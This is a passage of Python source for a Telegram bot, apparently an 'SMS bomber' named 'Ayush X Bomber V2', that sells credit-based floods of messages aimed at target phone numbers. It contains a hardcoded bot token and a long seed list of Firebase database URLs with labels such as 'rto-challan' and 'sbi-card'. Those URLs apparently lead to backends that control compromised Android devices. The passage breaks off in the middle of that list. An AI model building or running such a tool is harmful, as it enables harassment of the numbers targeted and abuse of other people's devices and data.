#🗿 Bot Developer - @GOD_AYUSH
#🔰 Developer Channel - @Ayush_Hackz

import asyncio, json, os, time, logging, random, string, threading, re
from datetime import datetime
from copy import deepcopy
from collections import defaultdict
from flask import Flask, jsonify

import aiohttp
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramUnauthorizedError

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("BlastBot")

# ========== PREMIUM EMOJI IDs ==========
EMOJI_FIRE = "5289722755871162900"      # 🔥
EMOJI_STAR = "5372849966689566579"      # ⭐
EMOJI_ROCKET = "5359664288241829619"    # 🚀
EMOJI_CROWN = "6237927637906364256"     # 👑
EMOJI_SHIELD = "6235476345451716705"    # 🛡
EMOJI_MONEY = "6244678063775289843"     # 💰
EMOJI_PHONE = "6239930832128056797"     # 📱
EMOJI_CHECK = "4958689671950369798"     # ✅
EMOJI_CROSS = "4958900559139570572"     # ❌
EMOJI_WARNING = "4958526153955476488"   # ⚠️
EMOJI_LOCK = "4956719506027185156"      # 🔒
EMOJI_GIFT = "5084613633418199991"      # 🎁
EMOJI_BELL = "5098265504796115765"      # 🔔
EMOJI_GEAR = "5116414868357907335"      # ⚙️
EMOJI_VIDEO = "5372849966689566579"     # 📹

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    return fallback   # tg-emoji disabled

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    return InlineKeyboardButton(text=label, callback_data=callback_data)

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    label = f"{fallback_emoji} {sc(text)}".strip() if fallback_emoji else sc(text)
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=sc(text), request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        setattr(kb_btn, "style", style)
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("🚀 Start Blast", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

# @GOD_AYUSH is the owner — his Telegram ID is loaded from blast_data.json
# Fallback IDs kept for safety during first boot
MAIN_OWNER = 7758917200   # Will be overridden from blast_data.json owners list
SUPER_ADMIN_NAME = "@GOD_AYUSH"
SUPER_ADMIN_LINK = "https://t.me/GOD_AYUSH"
SUPER_ADMINS = [8005637428, 7758917200]  # Both old + new owners kept

BOT_TOKEN = "9161478208:AAFBhGuYUAQZQIgbuVqosd0koXJQG4o0QMA"

_DATA_FILE = "blast_data.json"
_VERSION = "💣 Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2"

# ================= FLASK HEALTH CHECK SERVER =================
PORT = int(os.environ.get("PORT", "10000"))
web = Flask(__name__)

@web.get("/")
def home():
    return jsonify({"status": "ok", "service": "Telegram Blast Bot", "version": _VERSION})

@web.get("/health")
def health():
    return jsonify({"status": "healthy"}), 200

def run_flask():
    # Flask ko alag thread me run karein taaki main event loop block na ho
    web.run(host="0.0.0.0", port=PORT, use_reloader=False)
# ==============================================================

# Multiple intro videos — one picked at random each time
_VIDEO_BASE = os.path.dirname(os.path.abspath(__file__))
_VIDEO_ALT  = r"C:\Users\Vivek\Desktop\bc"
def _vp(name):
    p = os.path.join(_VIDEO_BASE, name)
    return p if os.path.exists(p) else os.path.join(_VIDEO_ALT, name)

DEFAULT_VIDEO_PATHS = [
    _vp("VID_20261025_182940_160.mp4"),
    _vp("video6296365027360253418.mp4"),
    _vp("video6296365027360253419.mp4"),
    _vp("video6296365027360253420.mp4"),
    _vp("document_6296438462711079162.mp4"),  # fallback
]
DEFAULT_VIDEO_PATH = next((p for p in DEFAULT_VIDEO_PATHS if os.path.exists(p)), None)

# Cache per video path so each video gets its own file_id
CACHED_VIDEO_FILE_IDS: dict = {}  # path -> telegram file_id
CACHED_VIDEO_FILE_ID = ""  # keep for legacy compat
LOG_CHANNEL_ID = -1004331208240

_PROGRESS_UPDATE_INTERVAL = 1.0
_SEND_DELAY = 0.0  # HYPERSPEED: Absolute zero delay
_BACKGROUND_SCAN_INTERVAL = 60.0  # Scan every 60s — fresh devices, no CPU overload

SPEED_FAST   = 0.0    # NO delay — maximum fire rate
SPEED_MEDIUM = 0.0    # NO delay — still full speed
SPEED_SLOW   = 0.01   # minimal 10ms between sends
SPEED_DEFAULT = SPEED_FAST

# ===== ULTRA PARALLEL ENGINE SETTINGS =====
_ULTRA_SEM_LIMIT   = 300     # 300 concurrent max — stable & fast
_ULTRA_BURST_SLEEP = 0.05    # 50ms between bursts — prevents event loop block
_ULTRA_FB_TIMEOUT  = 6       # Per-request Firebase timeout (seconds)
# ==========================================


# 3D Rocket / Aeroplane Launch Animation Effect
ROCKET_EFFECT_ID = "5046509860389126442" # Telegram Premium Celebration / Launch Effect

async def send_fire_effect_private(bot: Bot, chat_id: int):
    # Disabled network spam to keep bot 100% fast
    return


async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Failed to send channel log: {e}")

class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid']

    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None

USER_SESSIONS = {}
SESSIONS_LOCK = asyncio.Lock()
CACHED_DEVICES = []
LAST_SCAN_TIME = 0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
DEVICE_HEALTH_LOG = []
FB_DEVICE_COUNTS = {}
SCAN_LOCK = asyncio.Lock()
PROTECTED_NUMBERS = {}

class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()  # 🌟 NEW STATE FOR TXT FILE UPLOAD
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    access_uid = State()
    access_days = State()
    access_del_uid = State()
    send_duration_custom = State()
    owner_send_duration_custom = State()
    admin_send_duration_custom = State()

def _default_data() -> dict:
    # Ye saare URLs tumhari final.txt file se liye gaye hain
    seed_firebases = [
        {"id": "fb_1", "url": "https://rto-34-1f836-default-rtdb.firebaseio.com", "label": "rto-34", "added_at": int(time.time())},
        {"id": "fb_2", "url": "https://rto-gt6-02-05-2026-default-rtdb.firebaseio.com", "label": "rto-gt6", "added_at": int(time.time())},
        {"id": "fb_3", "url": "https://rto23-a5d99-default-rtdb.firebaseio.com", "label": "rto23", "added_at": int(time.time())},
        {"id": "fb_4", "url": "https://rto43-32636-default-rtdb.firebaseio.com", "label": "rto43", "added_at": int(time.time())},
        {"id": "fb_5", "url": "https://rtx-c9-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "rtx-c9", "added_at": int(time.time())},
        {"id": "fb_6", "url": "https://rupesh-6c5e5-default-rtdb.firebaseio.com", "label": "rupesh", "added_at": int(time.time())},
        {"id": "fb_7", "url": "https://sallu-9934f-default-rtdb.firebaseio.com", "label": "sallu", "added_at": int(time.time())},
        {"id": "fb_8", "url": "https://saluu-dcb00-default-rtdb.firebaseio.com", "label": "saluu", "added_at": int(time.time())},
        {"id": "fb_9", "url": "https://sanj-683c4-default-rtdb.firebaseio.com", "label": "sanj", "added_at": int(time.time())},
        {"id": "fb_10", "url": "https://sbi-card-c24ef-default-rtdb.firebaseio.com", "label": "sbi-card", "added_at": int(time.time())},
        {"id": "fb_11", "url": "https://second-wife-5-default-rtdb.firebaseio.com", "label": "second-wife", "added_at": int(time.time())},
        {"id": "fb_12", "url": "https://sexychat-cc66f-default-rtdb.firebaseio.com", "label": "sexychat", "added_at": int(time.time())},
        {"id": "fb_13", "url": "https://sher-61c70-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "sher", "added_at": int(time.time())},
        {"id": "fb_14", "url": "https://shjsjsh-f7ce0-default-rtdb.firebaseio.com", "label": "shjsjsh", "added_at": int(time.time())},
        {"id": "fb_15", "url": "https://shsh-fb9c8-default-rtdb.firebaseio.com", "label": "shsh", "added_at": int(time.time())},
        {"id": "fb_16", "url": "https://shubh-befd9-default-rtdb.firebaseio.com", "label": "shubh", "added_at": int(time.time())},
        {"id": "fb_17", "url": "https://shy-and-default-rtdb.firebaseio.com", "label": "shy-and", "added_at": int(time.time())},
        {"id": "fb_18", "url": "https://skraj-2fb05-default-rtdb.firebaseio.com", "label": "skraj", "added_at": int(time.time())},
        {"id": "fb_19", "url": "https://smayraina-e0a12-default-rtdb.firebaseio.com", "label": "smayraina", "added_at": int(time.time())},
        {"id": "fb_20", "url": "https://sonam-872e5-default-rtdb.firebaseio.com", "label": "sonam", "added_at": int(time.time())},
        {"id": "fb_21", "url": "https://subhunew-ac0dc-default-rtdb.firebaseio.com", "label": "subhunew", "added_at": int(time.time())},
        {"id": "fb_22", "url": "https://sumansk-f1c04-default-rtdb.firebaseio.com", "label": "sumansk", "added_at": int(time.time())},
        {"id": "fb_23", "url": "https://sundhaiii-default-rtdb.firebaseio.com", "label": "sundhaiii", "added_at": int(time.time())},
        {"id": "fb_24", "url": "https://super-income-d7382-default-rtdb.firebaseio.com", "label": "super-income", "added_at": int(time.time())},
        {"id": "fb_25", "url": "https://suraj1932-468ad-default-rtdb.firebaseio.com", "label": "suraj1932", "added_at": int(time.time())},
        {"id": "fb_26", "url": "https://suresh-7ec38-default-rtdb.firebaseio.com", "label": "suresh", "added_at": int(time.time())},
        {"id": "fb_27", "url": "https://taaaar-f97b6-default-rtdb.firebaseio.com", "label": "taaaar", "added_at": int(time.time())},
        {"id": "fb_28", "url": "https://tabuna-4e962-default-rtdb.firebaseio.com", "label": "tabuna", "added_at": int(time.time())},
        {"id": "fb_29", "url": "https://taniya-setup-panel-default-rtdb.firebaseio.com", "label": "taniya-setup", "added_at": int(time.time())},
        {"id": "fb_30", "url": "https://teddymcdonald-81002-default-rtdb.firebaseio.com", "label": "teddymcdonald", "added_at": int(time.time())},
        {"id": "fb_31", "url": "https://terimaakichut-ce92d-default-rtdb.firebaseio.com", "label": "terimaakichut", "added_at": int(time.time())},
        {"id": "fb_32", "url": "https://tested-d85ca-default-rtdb.firebaseio.com", "label": "tested", "added_at": int(time.time())},
        {"id": "fb_33", "url": "https://testingyou-2dcac-default-rtdb.firebaseio.com", "label": "testingyou", "added_at": int(time.time())},
        {"id": "fb_34", "url": "https://tinku-152d3-default-rtdb.firebaseio.com", "label": "tinku", "added_at": int(time.time())},
        {"id": "fb_35", "url": "https://tryagain2new-default-rtdb.firebaseio.com", "label": "tryagain2new", "added_at": int(time.time())},
        {"id": "fb_36", "url": "https://unknown-5b51e-default-rtdb.firebaseio.com", "label": "unknown", "added_at": int(time.time())},
        {"id": "fb_37", "url": "https://uuuu-c9515-default-rtdb.firebaseio.com", "label": "uuuu", "added_at": int(time.time())},
        {"id": "fb_38", "url": "https://vault-29e76-default-rtdb.firebaseio.com", "label": "vault", "added_at": int(time.time())},
        {"id": "fb_39", "url": "https://vhjhfhjgjy-default-rtdb.firebaseio.com", "label": "vhjhfhjgjy", "added_at": int(time.time())},
        {"id": "fb_40", "url": "https://videocalls-f3434-default-rtdb.firebaseio.com", "label": "videocalls", "added_at": int(time.time())},
        {"id": "fb_41", "url": "https://vishnu-cha-1-default-rtdb.firebaseio.com", "label": "vishnu-cha", "added_at": int(time.time())},
        {"id": "fb_42", "url": "https://vishres-cartoon-default-rtdb.firebaseio.com", "label": "vishres", "added_at": int(time.time())},
        {"id": "fb_43", "url": "https://vivov-df9bb-default-rtdb.firebaseio.com", "label": "vivov", "added_at": int(time.time())},
        {"id": "fb_44", "url": "https://webfund3-default-rtdb.firebaseio.com", "label": "webfund3", "added_at": int(time.time())},
        {"id": "fb_45", "url": "https://westsidestory-1334f-default-rtdb.firebaseio.com", "label": "westsidestory", "added_at": int(time.time())},
        {"id": "fb_46", "url": "https://xxxxz-2e129-default-rtdb.firebaseio.com", "label": "xxxxz", "added_at": int(time.time())},
        {"id": "fb_47", "url": "https://ybvggg-aa0f5-default-rtdb.firebaseio.com", "label": "ybvggg", "added_at": int(time.time())},
        {"id": "fb_48", "url": "https://yellow-new-panel-default-rtdb.firebaseio.com", "label": "yellow-new", "added_at": int(time.time())},
        {"id": "fb_49", "url": "https://yellow-new-panel-rto-srrbdb-default-rtdb.firebaseio.com", "label": "yellow-new-panel", "added_at": int(time.time())},
        {"id": "fb_50", "url": "https://yellowstone-7a62e-default-rtdb.firebaseio.com", "label": "yellowstone", "added_at": int(time.time())},
        {"id": "fb_51", "url": "https://yt-khan-default-rtdb.firebaseio.com", "label": "yt-khan", "added_at": int(time.time())},
        {"id": "fb_52", "url": "https://yuttdftt-default-rtdb.firebaseio.com", "label": "yuttdftt", "added_at": int(time.time())},
        {"id": "fb_53", "url": "https://maja-d960d-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "maja", "added_at": int(time.time())},
        {"id": "fb_54", "url": "https://ramu-admin-panel-default-rtdb.firebaseio.com", "label": "ramu-admin", "added_at": int(time.time())},
        {"id": "fb_55", "url": "https://kkdkumar-4e971-default-rtdb.firebaseio.com", "label": "kkdkumar", "added_at": int(time.time())},
        {"id": "fb_56", "url": "https://madhu838-18bac-default-rtdb.firebaseio.com", "label": "madhu838", "added_at": int(time.time())},
        {"id": "fb_57", "url": "https://hggeefcggj-default-rtdb.firebaseio.com", "label": "hggeefcggj", "added_at": int(time.time())},
        {"id": "fb_58", "url": "https://alok5u2-default-rtdb.firebaseio.com", "label": "alok5u2", "added_at": int(time.time())},
        {"id": "fb_59", "url": "https://fwwg-d04bc-default-rtdb.firebaseio.com", "label": "fwwg", "added_at": int(time.time())},
        {"id": "fb_60", "url": "https://kunal-86274-default-rtdb.firebaseio.com", "label": "kunal", "added_at": int(time.time())},
        {"id": "fb_61", "url": "https://asia-southeast1.firebasedatabase.app", "label": "asia-southeast1", "added_at": int(time.time())},
        {"id": "fb_62", "url": "https://subjuoeh-default-rtdb.firebaseio.com", "label": "subjuoeh", "added_at": int(time.time())},
        {"id": "fb_63", "url": "https://room-hotel-default-rtdb.firebaseio.com", "label": "room-hotel", "added_at": int(time.time())},
        {"id": "fb_64", "url": "https://saaasaa-c28c1-default-rtdb.firebaseio.com", "label": "saaasaa", "added_at": int(time.time())},
        {"id": "fb_65", "url": "https://sanjee-39ed8-default-rtdb.firebaseio.com", "label": "sanjee", "added_at": int(time.time())},
        {"id": "fb_66", "url": "https://rcbfan-1c031-default-rtdb.firebaseio.com", "label": "rcbfan", "added_at": int(time.time())},
        {"id": "fb_67", "url": "https://dhiko0909-default-rtdb.firebaseio.com", "label": "dhiko0909", "added_at": int(time.time())},
        {"id": "fb_68", "url": "https://ajuk-4a6ce-default-rtdb.firebaseio.com", "label": "ajuk", "added_at": int(time.time())},
        {"id": "fb_69", "url": "https://rk-panell-default-rtdb.firebaseio.com", "label": "rk-panell", "added_at": int(time.time())},
        {"id": "fb_70", "url": "https://sunil-da-default-rtdb.firebaseio.com", "label": "sunil-da", "added_at": int(time.time())},
        {"id": "fb_71", "url": "https://oyilo-5cada-default-rtdb.firebaseio.com", "label": "oyilo", "added_at": int(time.time())},
        {"id": "fb_72", "url": "https://sanjivl-default-rtdb.firebaseio.com", "label": "sanjivl", "added_at": int(time.time())},
        {"id": "fb_73", "url": "https://vikram-c93c2-default-rtdb.firebaseio.com", "label": "vikram", "added_at": int(time.time())},
        {"id": "fb_74", "url": "https://manage-7d2ad-default-rtdb.firebaseio.com", "label": "manage", "added_at": int(time.time())},
        {"id": "fb_75", "url": "https://xxxcom-default-rtdb.firebaseio.com", "label": "xxxcom", "added_at": int(time.time())},
        {"id": "fb_76", "url": "https://ajit-20ba4-default-rtdb.firebaseio.com", "label": "ajit", "added_at": int(time.time())},
        {"id": "fb_77", "url": "https://dipukumar21-9cc34-default-rtdb.firebaseio.com", "label": "dipukumar21", "added_at": int(time.time())},
        {"id": "fb_78", "url": "https://land-le-mera-default-rtdb.firebaseio.com", "label": "land-le-mera", "added_at": int(time.time())},
        {"id": "fb_79", "url": "https://dippsanj-4fe1c-default-rtdb.firebaseio.com", "label": "dippsanj", "added_at": int(time.time())},
        {"id": "fb_80", "url": "https://panel-jack-default-rtdb.firebaseio.com", "label": "panel-jack", "added_at": int(time.time())},
        {"id": "fb_81", "url": "https://simran-2f56c-default-rtdb.firebaseio.com", "label": "simran", "added_at": int(time.time())},
        {"id": "fb_82", "url": "https://hospitel-15-default-rtdb.firebaseio.com", "label": "hospitel", "added_at": int(time.time())},
        {"id": "fb_83", "url": "https://rama-eb8cc-default-rtdb.firebaseio.com", "label": "rama", "added_at": int(time.time())},
        {"id": "fb_84", "url": "https://callmevillen12-default-rtdb.firebaseio.com", "label": "callmevillen12", "added_at": int(time.time())},
        {"id": "fb_85", "url": "https://sumnmmn-default-rtdb.firebaseio.com", "label": "sumnmmn", "added_at": int(time.time())},
        {"id": "fb_86", "url": "https://admin-22-8dbcc-default-rtdb.firebaseio.com", "label": "admin-22", "added_at": int(time.time())},
        {"id": "fb_87", "url": "https://tekoff-7a789-default-rtdb.firebaseio.com", "label": "tekoff", "added_at": int(time.time())},
        {"id": "fb_88", "url": "https://ownerison-3da10-default-rtdb.firebaseio.com", "label": "ownerison", "added_at": int(time.time())},
        {"id": "fb_89", "url": "https://ilohsh-default-rtdb.firebaseio.com", "label": "ilohsh", "added_at": int(time.time())},
        {"id": "fb_90", "url": "https://super-admin-240f4-default-rtdb.firebaseio.com", "label": "super-admin", "added_at": int(time.time())},
        {"id": "fb_91", "url": "https://orukd-1e1c7-default-rtdb.firebaseio.com", "label": "orukd", "added_at": int(time.time())},
        {"id": "fb_92", "url": "https://sannn-5d617-default-rtdb.firebaseio.com", "label": "sannn", "added_at": int(time.time())},
        {"id": "fb_93", "url": "https://mosa-j-default-rtdb.firebaseio.com", "label": "mosa-j", "added_at": int(time.time())},
        {"id": "fb_94", "url": "https://senu-cbca6-default-rtdb.firebaseio.com", "label": "senu", "added_at": int(time.time())},
        {"id": "fb_95", "url": "https://ashokmahra-4a762-default-rtdb.firebaseio.com", "label": "ashokmahra", "added_at": int(time.time())},
        {"id": "fb_96", "url": "https://rudraapk-f3779-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "rudraapk", "added_at": int(time.time())},
        {"id": "fb_97", "url": "https://ranjit-58640-default-rtdb.firebaseio.com", "label": "ranjit", "added_at": int(time.time())},
        {"id": "fb_98", "url": "https://lodarasun-52af9-default-rtdb.firebaseio.com", "label": "lodarasun", "added_at": int(time.time())},
        {"id": "fb_99", "url": "https://jassi-952bc-default-rtdb.firebaseio.com", "label": "jassi", "added_at": int(time.time())},
        {"id": "fb_100", "url": "https://kajumyjann-default-rtdb.firebaseio.com", "label": "kajumyjann", "added_at": int(time.time())},
        {"id": "fb_101", "url": "https://juss-pilado-default-rtdb.firebaseio.com", "label": "juss-pilado", "added_at": int(time.time())},
        {"id": "fb_102", "url": "https://rosni-9bb5c-default-rtdb.firebaseio.com", "label": "rosni", "added_at": int(time.time())},
        {"id": "fb_103", "url": "https://bewafa-f42d3-default-rtdb.firebaseio.com", "label": "bewafa", "added_at": int(time.time())},
        {"id": "fb_104", "url": "https://kamlusinghaniya-f05d5-default-rtdb.firebaseio.com", "label": "kamlusinghaniya", "added_at": int(time.time())},
        {"id": "fb_105", "url": "https://kalihumai-f9826-default-rtdb.firebaseio.com", "label": "kalihumai", "added_at": int(time.time())},
        {"id": "fb_106", "url": "https://nyawala-3e7c3-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "nyawala", "added_at": int(time.time())},
        {"id": "fb_107", "url": "https://jackie-7a125-default-rtdb.firebaseio.com", "label": "jackie", "added_at": int(time.time())},
        {"id": "fb_108", "url": "https://bosobeta-default-rtdb.asia-southeast1.firebasedatabase.app", "label": "bosobeta", "added_at": int(time.time())},
        {"id": "fb_109", "url": "https://rani-c5a67-default-rtdb.firebaseio.com", "label": "rani", "added_at": int(time.time())},
        {"id": "fb_110", "url": "https://nanichodu-a1820-default-rtdb.firebaseio.com", "label": "nanichodu", "added_at": int(time.time())},
        {"id": "fb_111", "url": "https://vjufjfutfu-default-rtdb.firebaseio.com", "label": "vjufjfutfu", "added_at": int(time.time())},
        {"id": "fb_112", "url": "https://gddjfnk-default-rtdb.firebaseio.com", "label": "gddjfnk", "added_at": int(time.time())},
        {"id": "fb_113", "url": "https://vicky-singh-20bdd-default-rtdb.firebaseio.com", "label": "vicky-singh", "added_at": int(time.time())},
        {"id": "fb_114", "url": "https://vamp-6f2ca-default-rtdb.firebaseio.com", "label": "vamp", "added_at": int(time.time())},
        {"id": "fb_115", "url": "https://mer54-4cab9-default-rtdb.firebaseio.com", "label": "mer54", "added_at": int(time.time())},
        {"id": "fb_116", "url": "https://raju-b3e2b-default-rtdb.firebaseio.com", "label": "raju", "added_at": int(time.time())},
        {"id": "fb_117", "url": "https://gahaha-7ad23-default-rtdb.firebaseio.com", "label": "gahaha", "added_at": int(time.time())},
        {"id": "fb_118", "url": "https://safi-b575f-default-rtdb.firebaseio.com", "label": "safi", "added_at": int(time.time())},
        {"id": "fb_119", "url": "https://don-pannel-default-rtdb.firebaseio.com", "label": "don-pannel", "added_at": int(time.time())},
        {"id": "fb_120", "url": "https://kali-of-default-rtdb.firebaseio.com", "label": "kali-of", "added_at": int(time.time())},
        {"id": "fb_121", "url": "https://pikachu-650de-default-rtdb.firebaseio.com", "label": "pikachu", "added_at": int(time.time())},
        {"id": "fb_122", "url": "https://roya-admin-default-rtdb.firebaseio.com", "label": "roya-admin", "added_at": int(time.time())},
        {"id": "fb_123", "url": "https://shrutiyellow02-default-rtdb.firebaseio.com", "label": "shrutiyellow02", "added_at": int(time.time())},
        {"id": "fb_124", "url": "https://mafiyaboy-752c8-default-rtdb.firebaseio.com", "label": "mafiyaboy", "added_at": int(time.time())},
        {"id": "fb_125", "url": "https://twoo-2c7e8-default-rtdb.firebaseio.com", "label": "twoo", "added_at": int(time.time())},
        {"id": "fb_126", "url": "https://sukl-9bc58-default-rtdb.firebaseio.com", "label": "sukl", "added_at": int(time.time())},
        {"id": "fb_127", "url": "https://pmkishan-cbc4c-default-rtdb.firebaseio.com", "label": "pmkishan", "added_at": int(time.time())},
        {"id": "fb_128", "url": "https://rahult-6230c-default-rtdb.firebaseio.com", "label": "rahult", "added_at": int(time.time())},
        {"id": "fb_129", "url": "https://fir-5d7d9-default-rtdb.firebaseio.com", "label": "fir", "added_at": int(time.time())},
        {"id": "fb_130", "url": "https://upgrate-598ea-default-rtdb.firebaseio.com", "label": "upgrate", "added_at": int(time.time())},
        {"id": "fb_131", "url": "https://rrrf-a29f0-default-rtdb.firebaseio.com", "label": "rrrf", "added_at": int(time.time())},
        {"id": "fb_132", "url": "https://ladh-cb-default-rtdb.firebaseio.com", "label": "ladh-cb", "added_at": int(time.time())},
        {"id": "fb_133", "url": "https://raj-sk-panel-default-rtdb.firebaseio.com", "label": "raj-sk-panel", "added_at": int(time.time())},
        {"id": "fb_134", "url": "https://e5turnament3-default-rtdb.firebaseio.com", "label": "e5turnament3", "added_at": int(time.time())},
        {"id": "fb_135", "url": "https://paredghji-default-rtdb.firebaseio.com", "label": "paredghji", "added_at": int(time.time())},
        {"id": "fb_136", "url": "https://rajaj-40298-default-rtdb.firebaseio.com", "label": "rajaj", "added_at": int(time.time())},
        {"id": "fb_137", "url": "https://ertyres-20c09-default-rtdb.firebaseio.com", "label": "ertyres", "added_at": int(time.time())},
        {"id": "fb_138", "url": "https://rajsbh-977f2-default-rtdb.firebaseio.com", "label": "rajsbh", "added_at": int(time.time())},
        {"id": "fb_139", "url": "https://momo2222-default-rtdb.firebaseio.com", "label": "momo2222", "added_at": int(time.time())},
        {"id": "fb_140", "url": "https://servicesstaffhgu-default-rtdb.firebaseio.com", "label": "servicesstaffhgu", "added_at": int(time.time())},
        {"id": "fb_141", "url": "https://kaal-347f1-default-rtdb.firebaseio.com", "label": "kaal", "added_at": int(time.time())},
        {"id": "fb_142", "url": "https://kumari-d834c-default-rtdb.firebaseio.com", "label": "kumari", "added_at": int(time.time())},
        {"id": "fb_143", "url": "https://pnkjgds-default-rtdb.firebaseio.com", "label": "pnkjgds", "added_at": int(time.time())},
        {"id": "fb_144", "url": "https://afroar-66af-default-rtdb.firebaseio.com", "label": "afroar", "added_at": int(time.time())},
        {"id": "fb_145", "url": "https://ahmedpanel-e3d2d-default-rtdb.firebaseio.com", "label": "ahmedpanel", "added_at": int(time.time())},
        {"id": "fb_146", "url": "https://anshu3-f6fbf-default-rtdb.firebaseio.com", "label": "anshu3", "added_at": int(time.time())},
        {"id": "fb_147", "url": "https://aya-baby-34912-default-rtdb.firebaseio.com", "label": "aya-baby", "added_at": int(time.time())},
        {"id": "fb_148", "url": "https://bigg-panal-7fbe5-default-rtdb.firebaseio.com", "label": "bigg-panal", "added_at": int(time.time())},
        {"id": "fb_149", "url": "https://bittu-panal-cleint-default-rtdb.firebaseio.com", "label": "bittu-panal", "added_at": int(time.time())},
        {"id": "fb_150", "url": "https://boll512-6a2f0-default-rtdb.firebaseio.com", "label": "boll512", "added_at": int(time.time())},
        {"id": "fb_151", "url": "https://bomi-2ac9a-default-rtdb.firebaseio.com", "label": "bomi", "added_at": int(time.time())},
        {"id": "fb_152", "url": "https://chunnu-25c16-default-rtdb.firebaseio.com", "label": "chunnu", "added_at": int(time.time())},
        {"id": "fb_153", "url": "https://kajalkumari-4d7a5-default-rtdb.firebaseio.com", "label": "kajalkumari", "added_at": int(time.time())},
        {"id": "fb_154", "url": "https://kirtika-efac1-default-rtdb.firebaseio.com", "label": "kirtika", "added_at": int(time.time())},
        {"id": "fb_155", "url": "https://nandan-rto-default-rtdb.firebaseio.com", "label": "nandan-rto", "added_at": int(time.time())},
        {"id": "fb_156", "url": "https://nmpanagr-default-rtdb.firebaseio.com", "label": "nmpanagr", "added_at": int(time.time())},
        {"id": "fb_157", "url": "https://palms-568c7-default-rtdb.firebaseio.com", "label": "palms", "added_at": int(time.time())},
        {"id": "fb_158", "url": "https://planning-with-ai48-default-rtdb.firebaseio.com", "label": "planning-with-ai48", "added_at": int(time.time())},
        {"id": "fb_159", "url": "https://pmkisan2-c1211-default-rtdb.firebaseio.com", "label": "pmkisan2", "added_at": int(time.time())},
        {"id": "fb_160", "url": "https://project-1-16da0-default-rtdb.firebaseio.com", "label": "project-1", "added_at": int(time.time())},
        {"id": "fb_161", "url": "https://raja-4455d-default-rtdb.firebaseio.com", "label": "raja", "added_at": int(time.time())},
        {"id": "fb_162", "url": "https://rajanmadarchod-fa98d-default-rtdb.firebaseio.com", "label": "rajanmadarchod", "added_at": int(time.time())},
        {"id": "fb_163", "url": "https://ranuos-default-rtdb.firebaseio.com", "label": "ranuos", "added_at": int(time.time())},
        {"id": "fb_164", "url": "https://rockeysinghagsg-default-rtdb.firebaseio.com", "label": "rockeysinghagsg", "added_at": int(time.time())},
        {"id": "fb_165", "url": "https://rto-challan-31546-default-rtdb.firebaseio.com", "label": "rto-challan", "added_at": int(time.time())},
        {"id": "fb_166", "url": "https://rtor-83049-default-rtdb.firebaseio.com", "label": "rtor", "added_at": int(time.time())},
        {"id": "fb_167", "url": "https://sexychat-f56d0-default-rtdb.firebaseio.com", "label": "sexychat", "added_at": int(time.time())},
        {"id": "fb_168", "url": "https://shakti-9703d-default-rtdb.firebaseio.com", "label": "shakti", "added_at": int(time.time())},
        {"id": "fb_169", "url": "https://sk-admin-v-30-default-rtdb.firebaseio.com", "label": "sk-admin-v-30", "added_at": int(time.time())},
